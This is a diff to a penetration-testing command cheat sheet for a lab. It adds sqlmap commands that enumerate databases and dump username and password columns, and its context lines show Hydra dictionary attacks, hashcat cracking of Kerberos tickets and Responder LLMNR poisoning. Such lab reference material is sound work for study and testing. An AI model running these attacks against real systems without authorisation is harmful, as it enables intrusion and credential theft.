@@ -43,7 +43,29 @@ gobuster dir -u http://192.168.10.30 -w /usr/share/wordlists/dirbuster/directory
 
 ---
 
-## 3. Web & API Command-Line Requests (`curl`)
+## 3. Automated SQL Injection Testing (SQLMap)
+
+```bash
+# Basic parameter test & database enumeration
+sqlmap -u "http://192.168.10.30/page.php?id=7" --dbs
+
+# Test saved Burp Suite request file with parameter isolation
+sqlmap -r req.txt -p blood_group --dbs
+
+# Enumerate tables in target database
+sqlmap -r req.txt -D target_db --tables
+
+# Enumerate columns and dump table data
+sqlmap -r req.txt -D target_db -T users --columns
+sqlmap -r req.txt -D target_db -T users -C username,password --dump
+
+# Automated batch mode with proxy routing
+sqlmap -r req.txt --batch --proxy="http://127.0.0.1:8080"
+```
+
+---
+
+## 4. Web & API Command-Line Requests (`curl`)
 
 ```bash
 # Issue an HTTP GET request and inspect headers
@@ -61,7 +83,7 @@ curl -L http://192.168.10.30/
 
 ---
 
-## 4. Credential & Hash Cracking
+## 5. Credential & Hash Cracking
 
 ```bash
 # THC-Hydra HTTP Basic Auth dictionary attack
@@ -79,7 +101,7 @@ hashcat -m 13100 -a 0 tgs_ticket.txt /usr/share/wordlists/rockyou.txt
 
 ---
 
-## 5. Active Directory & Enterprise Lab Tools
+## 6. Active Directory & Enterprise Lab Tools
 
 ```bash
 # Launch Responder to poison LLMNR/NBT-NS queries on eth0
@@ -97,7 +119,7 @@ nslookup example.com 192.168.10.10
 
 ---
 
-## 6. Docker Container Management in Labs
+## 7. Docker Container Management in Labs
 
 ```bash
 # Launch OWASP Juice Shop container
